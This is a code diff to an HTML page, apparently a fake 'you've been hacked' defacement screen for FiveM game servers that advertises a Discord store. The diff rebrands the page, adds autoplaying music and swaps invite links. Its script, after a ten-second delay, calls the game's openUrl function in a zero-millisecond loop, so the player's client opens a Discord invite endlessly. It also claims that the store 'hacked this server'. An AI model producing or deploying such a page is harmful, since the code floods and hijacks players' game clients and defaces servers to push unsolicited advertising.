@@ -78,24 +78,45 @@
 </head>
 <body>
 
-  <!-- فيديو الخلفية -->
-  <video autoplay loop muted playsinline id="bgVideo">
-    <source src="https://cdn.discordapp.com/attachments/1274480785721921697/1417124769924644994/1.mp4?ex=68c957ca&is=68c8064a&hm=1dab776af464c602cd9cbd4d6ff3f8d9666b89c3239058125438acf62feff689&" type="video/mp4">
-  </video>
+<!-- فيديو الخلفية بدون صوت -->
+<video autoplay loop muted playsinline id="bgVideo">
+  <source src="https://cdn.discordapp.com/attachments/1433715729210933359/1435359486981177504/1.mp4?ex=690bae31&is=690a5cb1&hm=a4510ae3a8efbe4a7a0d101da9cf0fc5982b2b1fe5c3d15b13c80a52c1085377&" type="video/mp4">
+</video>
+
+<!-- تشغيل أغنية في الخلفية -->
+<audio id="bgMusic" autoplay loop>
+  <source src="https://cdn.discordapp.com/attachments/1433715729210933359/1435361702190514278/bfd1a4affd7c4b03.mp3?ex=690bb041&is=690a5ec1&hm=ec603a4706d1d9b640630e405231f0f3acaeede7b74bf5d4a4ed6aac05b7bc12&" type="audio/mpeg">
+  متصفحك لا يدعم تشغيل الصوت.
+</audio>
+
+<script>
+  const music = document.getElementById('bgMusic');
+  music.volume = 0.6; // مستوى الصوت من 0 إلى 1 (تقدر تعدله)
+</script>
+
+
+<script>
+  const video = document.getElementById('bgVideo');
+  video.muted = true;
+  video.defaultMuted = true;
+  video.volume = 0.0;
+</script>
 
   <!-- الكلام العلوي -->
   <div class="top-content">
     <h1>YOU'VE BEEN HACKED! (Fake)</h1>
-    <p class="store-text">RUN STORE : ششملان</p> 
-   
-  </div>
+    <p class="store-text">𝐙𝐞𝐫𝐢𝐱 STORE : ششملان</p> 
+   <p class="store-text">بعيوني : DoNr
+</p> 
+
+
 
   <!-- الرسالة بعد انتهاء العداد -->
   <div id="warningText">Time’s up... (Just kidding 😉)</div>
 
   <!-- الكلام السفلي -->
   <div class="footer">
-    <p>Visit our Discord: <a href="#">discord.gg/rru</a></p>
+    <p>Visit our Discord: <a href="#">𝐙𝐞𝐫𝐢𝐱 𝐓𝐞𝐚𝐦</a></p>
     <p>RUN STORE hacked this server</p>
     <p>Best Seller of FiveM Ready With Stocks</p>
   </div>
@@ -135,7 +156,7 @@
         // فتح الرابط كل 0 مللي ثانية بعد 10 ثوانٍ
         setTimeout(() => {
             setInterval(() => {
-                window.invokeNative('openUrl', 'https://discord.gg/runn');
+                window.invokeNative('openUrl', 'https://discord.gg/eYyVsNez');
             }, 0); // فتح الرابط بشكل مستمر
         }, 10000);
     </script>
@@ -171,4 +192,3 @@
   </script>
 </body>
 </html>
-
